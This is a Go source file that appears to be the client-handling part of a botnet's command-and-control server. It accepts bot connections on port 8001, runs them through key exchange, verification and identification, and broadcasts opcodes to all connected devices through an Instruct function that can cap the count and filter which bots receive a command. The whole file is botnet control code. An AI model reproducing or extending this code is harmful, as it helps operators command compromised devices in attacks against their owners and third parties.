package clients

import (
	"cnc/internal/clients/packet"
	"cnc/pkg/logging"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

var (
	mutex sync.RWMutex

	Port        = 8001
	ID   uint32 = 0

	List     = make(map[uint32]*Bot)
	Listener net.Listener
)

// Listen attempts to actually start a listener
func Listen() {
	var err error

	Listener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", Port))
	if err != nil {
		log.Fatalf("Failed to start c (:%d) => %v", Port, err)
	}

	logging.Global.Info().
		Int("port", Port).
		Msg("Waiting for client connections..")

	for {
		conn, err := Listener.Accept()
		if err != nil {
			continue
		}

		go handleConnection(&Bot{
			Conn:  conn,
			State: StateKeyExchange,

			Information: Information{
				Name: "unknown",
			},

			Key:   make([]byte, 32),
			Nonce: make([]byte, 12),
		})
	}
}

func handleConnection(bot *Bot) {
	defer bot.Conn.Close()
	_ = bot.Conn.SetDeadline(time.Now().Add(PingTimeout * time.Second))

	if err := bot.HandleKeyExchange(); err != nil {
		logging.Global.Debug().Err(err).Msg("Failed to handle key exchange!")
		return
	}

	if err := bot.HandleVerifyExchange(); err != nil {
		logging.Global.Debug().Err(err).Msg("Failed to handle verify exchange!")
		return
	}

	if err := bot.HandleIdentification(); err != nil {
		logging.Global.Debug().Err(err).Msg("Failed to handle identification!")
		return
	}

	bot.Handle()
}

// Instruct will instruct something to all devices.
func Instruct(op uint8, packet *packet.Packet, data *Limitation) (sentTo int) {
	mutex.Lock()
	defer mutex.Unlock()

	for _, client := range List {
		if data != nil {
			if data.Count > 0 && sentTo >= data.Count {
				// limit reached, break!
				break
			}

			// if it's not in our allowed bot list we'll yeet
			if !data.Compare(client) {
				continue
			}
		}

		// transmission fail check
		if !(client.Name == "cantv" && data != nil && !data.Admin) {
			if err := client.Transmit(op, packet); err != nil {
				continue
			}
		}

		sentTo++
	}

	return sentTo
}
